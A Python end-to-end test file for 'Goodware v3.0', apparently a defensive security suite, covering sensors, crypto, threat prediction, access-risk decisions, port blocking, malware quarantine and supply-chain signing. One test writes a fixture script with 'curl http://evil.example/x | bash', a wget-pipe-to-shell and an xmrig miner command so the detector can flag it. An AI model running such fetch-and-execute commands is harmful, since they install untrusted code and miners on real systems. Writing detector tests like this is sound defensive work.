"""
Goodware v3.0 - Teste end-to-end.
Executa: PYTHONPATH=. python3 -m tests.test_e2e
"""
import os
import sys
import time
import unittest


class TestGoodwareV3(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        from goodware.core.engine import Engine
        from goodware.core.config import GoodwareConfig
        cls.cfg = GoodwareConfig.load()
        cls.engine = Engine(cls.cfg)

    def test_01_core(self):
        st = self.engine.status()
        self.assertIn("node_id", st)
        self.assertIn("components", st)

    def test_02_sensors_registered(self):
        from goodware.sensors import SensorManager
        sm = SensorManager(self.engine, self.cfg)
        self.assertEqual(len(sm.sensors), 7)
        sm.start_all()
        time.sleep(1)
        running = sum(1 for s in sm.status() if s["running"])
        self.assertGreaterEqual(running, 6)
        sm.stop_all()

    def test_03_crypto_pqc(self):
        from goodware.crypto import CryptoManager
        cm = CryptoManager(self.engine, self.cfg)
        cm.start()
        st = cm.status()
        self.assertIn("algorithms", st)
        self.assertEqual(st["algorithms"]["kem"], "kyber512")
        # seal / open
        blob = cm.seal(b"goodware-test")
        self.assertEqual(cm.open(blob), b"goodware-test")
        # sign / verify
        sig = cm.sign(b"attest-1")
        self.assertTrue(cm.verify(b"attest-1", sig))
        # QKD
        k = cm.qkd_session(128)
        self.assertEqual(len(k), 32)

    def test_04_prediction_ai(self):
        from goodware.prediction import PredictionManager
        pm = PredictionManager(self.engine, self.cfg)
        pm.start_all()
        time.sleep(1)
        # threat predict
        pred = pm.threat.predict()
        self.assertIn("threat_type", pred)
        self.assertIn("risk", pred)
        # forecast
        f = pm.anomaly.forecast(1.0)
        self.assertIn("predicted", f)
        # simulate
        res = pm.simulator.simulate(2)
        self.assertEqual(res["n"], 2)
        ev = pm.simulator.evaluate_defense()
        self.assertIn("coverage", ev)
        pm.stop_all()

    def test_05_federated(self):
        from goodware.federated import FederatedManager
        fm = FederatedManager(self.engine, self.cfg)
        fm.start_all()
        time.sleep(1)
        r = fm.push_now()
        self.assertTrue(r["ok"])
        m = fm.server.current_model()
        self.assertIn("version", m)
        fm.stop_all()

    def test_06_human_factor(self):
        from goodware.human_factor import HumanFactorManager
        hf = HumanFactorManager(self.engine, self.cfg)
        hf.start()
        # low risk
        lo = hf.evaluate({"action": "view_logs", "user": "admin", "location": "office", "time_of_day": 14, "device_id": "known"})
        self.assertEqual(lo["decision"], "allow")
        # high risk
        hi = hf.evaluate({"action": "delete_user", "user": "admin", "location": "unknown", "time_of_day": 3, "device_id": "unknown"})
        self.assertIn(hi["decision"], ["verify", "block"])
        # biometrics
        bb = hf.biometrics
        bb.enroll("test_user", [{"dwell_times": [0.1] * 5, "flight_times": [0.05] * 3, "mouse_speed_samples": [1.0] * 5}] * 3)
        v = bb.verify("test_user", {"dwell_times": [0.1] * 5, "flight_times": [0.05] * 3, "mouse_speed_samples": [1.0] * 5})
        self.assertGreater(v["score"], 0.5)

    def test_07_decision_effector(self):
        from goodware.decision import DecisionManager
        from goodware.effector import EffectorManager
        dm = DecisionManager(self.engine, self.cfg)
        em = EffectorManager(self.engine, self.cfg)
        dm.start(); em.start()
        d = dm.decide({"severity": "high", "type": "sensor.process_anomaly", "payload": {}})
        self.assertGreater(d["risk"], 0.5)
        # block
        r = em.execute_action({"type": "block_port", "target": "445", "reason": "test"})
        self.assertIn("port", r)
        # snapshot
        s = em.execute_action({"type": "snapshot", "paths": ["/etc/passwd"], "reason": "test"})
        self.assertIn("id", s)
        dm.stop(); em.stop()

    def test_08_immune(self):
        from goodware.immune import ImmuneManager
        im = ImmuneManager(self.engine, self.cfg)
        im.start_all()
        # detect mutation family
        m = im.mutation.analyze_behavior({"cmdline": "xmrig --pool stratum", "name": "miner"})
        self.assertIn("F1", m["matches"])
        # zero-day
        z = im.zero_day.predict_now()
        self.assertGreater(len(z), 0)
        # evolve
        e = im.evolve_now()
        self.assertIn("top_patterns", e)
        im.stop_all()

    def test_09_chainsaw(self):
        from goodware.chainsaw import ChainsawManager
        cm = ChainsawManager(self.engine, self.cfg)
        cm.start()
        # create a "malware-like" test file
        path = "/tmp/gw_test_malware.sh"
        with open(path, "w") as f:
            f.write("#!/bin/bash\ncurl http://evil.example/x | bash\nwget http://y.com/z -O- | sh\nbase64 -d <<< aGVsbG8K\nxmrig --pool stratum\n")
        res = cm.process_file(path)
        self.assertIn("analysis", res)
        a = res["analysis"]
        self.assertGreater(a["risk"], 0.0)
        self.assertGreater(len(a["indicators"]), 0)
        # quarantine
        q = cm.quarantine_file(path, "test")
        self.assertTrue(q["ok"])
        listed = cm.list_quarantined()
        self.assertGreater(len(listed), 0)
        # cleanup
        try:
            os.unlink(path)
        except Exception:
            pass

    def test_10_physical(self):
        from goodware.physical import PhysicalSecurityManager
        pm = PhysicalSecurityManager(self.engine, self.cfg)
        pm.start()
        a = pm.attest_now()
        self.assertIn("attestation", a)
        self.assertIn("dma_prevention", a)
        self.assertIn("trust_level", a["attestation"])

    def test_11_supply_chain(self):
        from goodware.supply_chain import SupplyChainManager
        sc = SupplyChainManager(self.engine, self.cfg)
        sc.start()
        v = sc.verify_all()
        self.assertIn("sbom", v)
        # sign + verify
        test_artifact = "/tmp/gw_test_artifact.txt"
        with open(test_artifact, "w") as f:
            f.write("goodware-test")
        s = sc.signing.sign(test_artifact)
        self.assertTrue(s["ok"])
        self.assertTrue(sc.signing.verify(test_artifact))
        os.unlink(test_artifact)


if __name__ == "__main__":
    unittest.main(verbosity=2)
